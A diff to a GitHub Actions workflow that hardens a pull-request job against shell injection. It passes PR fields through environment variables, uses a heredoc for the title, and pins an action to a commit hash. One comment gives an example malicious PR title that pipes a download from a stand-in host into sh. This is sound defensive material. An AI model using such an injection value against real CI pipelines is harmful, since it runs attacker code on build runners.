@@ -36,21 +36,35 @@ jobs:
 
       - name: Get PR diff and context
         id: pr-info
+        env:
+          # Attacker-controlled text (a PR title is whatever the author typed) reaches the shell
+          # only as env vars — never interpolated into the script. Interpolated, a title like
+          # `"; curl evil.sh | sh; #` would execute on the runner.
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          PR_CHANGED_FILES: ${{ github.event.pull_request.changed_files }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "pr_number=${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
-          echo "pr_title=${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"
-          echo "author=${{ github.event.pull_request.user.login }}" >> "$GITHUB_OUTPUT"
-          echo "changed_files=${{ github.event.pull_request.changed_files }}" >> "$GITHUB_OUTPUT"
+          {
+            echo "pr_number=$PR_NUMBER"
+            echo "author=$PR_AUTHOR"
+            echo "changed_files=$PR_CHANGED_FILES"
+            # Heredoc: a title with a newline would otherwise forge extra outputs.
+            echo "pr_title<<PR_TITLE_EOF"
+            echo "$PR_TITLE"
+            echo "PR_TITLE_EOF"
+          } >> "$GITHUB_OUTPUT"
 
-          gh pr diff ${{ github.event.pull_request.number }} > /tmp/pr.diff 2>/dev/null || true
-          gh pr view ${{ github.event.pull_request.number }} \
+          gh pr diff "$PR_NUMBER" > /tmp/pr.diff 2>/dev/null || true
+          gh pr view "$PR_NUMBER" \
             --json title,body,files,commits > /tmp/pr-context.json 2>/dev/null || true
-          gh pr diff ${{ github.event.pull_request.number }} --name-only \
+          gh pr diff "$PR_NUMBER" --name-only \
             | grep -vE '^docs/|^CHANGELOG\.md|^README\.md$' \
             > /tmp/changed-files.txt 2>/dev/null || touch /tmp/changed-files.txt
 
       - name: Generate Release Notes and Documentation Updates
-        uses: anthropics/claude-code-action@v1
+        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
         with:
           claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
 
